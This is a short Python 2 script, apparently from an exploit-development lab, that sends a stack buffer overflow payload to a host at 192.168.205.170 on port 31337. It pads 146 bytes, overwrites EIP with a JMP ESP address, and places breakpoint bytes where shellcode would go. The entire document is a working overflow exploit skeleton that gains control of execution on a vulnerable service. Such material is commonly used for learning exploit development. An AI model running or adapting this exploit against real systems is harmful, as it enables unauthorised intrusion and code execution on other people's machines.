#!/usr/bin/env python2
import socket
import struct

RHOST="192.168.205.170"
RPORT=31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

total = 1024
offset = 146

jmpesp = 0x080414C3

buf = ""
buf = "A"*(offset - len(buf))
buf += struct.pack("<I", jmpesp) # EIP
buf += "\xCC\xCC\xCC\xCC"        # ESP
buf += "F"*(total - len(buf))
buf += "\n"

s.send(buf)

print "Sent: {0}".format(buf)

resp = s.recv(1024)
